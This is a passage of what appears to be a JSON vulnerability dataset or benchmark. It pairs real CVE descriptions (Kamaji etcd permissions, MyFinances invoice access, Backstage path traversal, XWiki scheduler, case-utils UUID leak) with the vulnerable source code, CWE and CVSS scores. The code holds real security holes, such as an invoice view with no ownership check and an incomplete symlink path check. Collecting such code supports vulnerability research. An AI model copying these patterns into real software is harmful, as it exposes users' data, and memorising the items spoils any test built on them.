        "func (e *EtcdClient) GrantPrivileges(ctx context.Context, user, dbName string) error {\n\tif _, err := e.Client.Auth.RoleAdd(ctx, dbName); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\tpermission := etcdclient.PermissionType(authpb.READWRITE)\n\tkey := e.buildKey(dbName)\n\tif _, err := e.Client.RoleGrantPermission(ctx, user, key, rangeEnd, permission); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\tif _, err := e.Client.UserGrantRole(ctx, user, dbName); err != nil {\n\t\treturn errors.NewGrantPrivilegesError(err)\n\t}\n\n\treturn nil\n}",
        "func (e *EtcdClient) Migrate(ctx context.Context, tcp kamajiv1alpha1.TenantControlPlane, target Connection) error {\n\ttargetClient := target.(*EtcdClient) //nolint:forcetypeassert\n\n\tif err := target.Check(ctx); err != nil {\n\t\treturn err\n\t}\n\n\tresponse, err := e.Client.Get(ctx, e.buildKey(fmt.Sprintf(\"%s_%s\", tcp.GetNamespace(), tcp.GetName())), etcdclient.WithRange(rangeEnd))\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfor _, kv := range response.Kvs {\n\t\tif _, err = targetClient.Client.Put(ctx, string(kv.Key), string(kv.Value)); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 71,
          "content": "\tif _, err := e.Client.RoleGrantPermission(ctx, user, key, rangeEnd, permission); err != nil {"
        },
        {
          "line_no": 184,
          "content": "\tresponse, err := e.Client.Get(ctx, e.buildKey(fmt.Sprintf(\"%s_%s\", tcp.GetNamespace(), tcp.GetName())), etcdclient.WithRange(rangeEnd))"
        }
      ]
    },
    "cwe": [
      "CWE-284"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 859,
    "cve": "CVE-2024-37889",
    "description": "MyFinances is a web application for managing finances. MyFinances has a way to access other customer invoices while signed in as a user. This method allows an actor to access PII and financial information from another account. The vulnerability is fixed in 0.4.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/views/core/invoices/edit.py",
          "content": "from datetime import datetime\n\nfrom django.contrib import messages\nfrom django.http import JsonResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.http import require_http_methods\n\nfrom backend.models import Invoice, Client, InvoiceItem\nfrom backend.types.htmx import HtmxHttpRequest\n\n\n# RELATED PATH FILES : \\frontend\\templates\\pages\\invoices\\dashboard\\_fetch_body.html, \\backend\\urls.py\n\n\n# Function that takes an invoice object and makes a dict of its attributes\ndef invoice_get_existing_data(invoice_obj):\n    stored_data = {\n        \"from_name\": invoice_obj.self_name,\n        \"from_company\": invoice_obj.self_company,\n        \"from_address\": invoice_obj.self_address,\n        \"from_city\": invoice_obj.self_city,\n        \"from_county\": invoice_obj.self_county,\n        \"from_country\": invoice_obj.self_country,\n        \"from_date_issued\": invoice_obj.date_issued,\n        \"from_date_due\": invoice_obj.date_due,\n        \"issue_date\": invoice_obj.date_issued,\n        \"due_date\": invoice_obj.date_due,\n        \"invoice_object\": invoice_obj,\n        \"currency_symbol\": invoice_obj.get_currency_symbol(),\n        \"rows\": invoice_obj.items.all(),\n    }\n    if invoice_obj.client_to:\n        stored_data[\"to_name\"] = invoice_obj.client_to.name\n        stored_data[\"to_company\"] = invoice_obj.client_to.company\n        stored_data[\"is_representative\"] = invoice_obj.client_to.is_representative\n        # stored_data[\"to_address\"] = invoice_obj.client_to.address\n        # stored_data[\"to_city\"] = invoice_obj.client_to.city\n        # stored_data[\"to_county\"] = invoice_obj.client_to.county\n        # stored_data[\"to_country\"] = invoice_obj.client_to.country\n    else:\n        stored_data[\"to_name\"] = invoice_obj.client_name\n        stored_data[\"to_company\"] = invoice_obj.client_company\n        stored_data[\"to_address\"] = invoice_obj.client_address\n        stored_data[\"to_city\"] = invoice_obj.client_city\n        stored_data[\"to_county\"] = invoice_obj.client_county\n        stored_data[\"to_country\"] = invoice_obj.client_country\n        stored_data[\"is_representative\"] = invoice_obj.client_is_representative\n\n    if invoice_obj.client_to:\n        stored_data[\"existing_client\"] = invoice_obj.client_to\n\n    return stored_data\n\n\n# gets invoice object from invoice id, convert obj to dict, and renders edit.html while passing the stored invoice values to frontend\ndef invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)\n\n\n# when user changes/modifies any of the fields with new information (during edit invoice)\n@require_http_methods([\"POST\"])\ndef edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n    elif request.user != invoice.user:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)\n\n\n# decorator & view function for rendering page and updating invoice items in the backend\n@require_http_methods([\"GET\", \"POST\"])\ndef edit_invoice_page(request: HtmxHttpRequest, invoice_id):\n    if request.method == \"POST\":\n        return edit_invoice(request, invoice_id)\n    return invoice_edit_page_get(request, invoice_id)\n"
        }
      ],
      "method_level": [
        "def invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)",
        "def edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n    elif request.user != invoice.user:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)"
      ],
      "hunk_level": [
        {
          "line_no": 60,
          "content": "        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)"
        },
        {
          "line_no": 75,
          "content": "    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:"
        },
        {
          "line_no": 76,
          "content": "        return JsonResponse("
        },
        {
          "line_no": 77,
          "content": "            {\"message\": \"You do not have permission to edit this invoice\"},"
        },
        {
          "line_no": 78,
          "content": "            status=403,"
        },
        {
          "line_no": 79,
          "content": "        )"
        },
        {
          "line_no": 80,
          "content": "    elif request.user != invoice.user:"
        }
      ]
    },
    "cwe": [
      "CWE-639"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 340,
    "cve": "CVE-2024-26150",
    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\nimport { realpathSync as realPath } from 'fs';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const targetPath = resolvePath(base, path);\n\n  if (!isChildPath(resolveRealPath(base), resolveRealPath(targetPath))) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\nfunction resolveRealPath(path: string): string {\n  try {\n    return realPath(path);\n  } catch (ex) {\n    if (ex.code !== 'ENOENT') {\n      throw ex;\n    }\n  }\n\n  return path;\n}\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "  const targetPath = resolvePath(base, path);"
        },
        {
          "line_no": 68,
          "content": "  if (!isChildPath(resolveRealPath(base), resolveRealPath(targetPath))) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 619,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 56,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        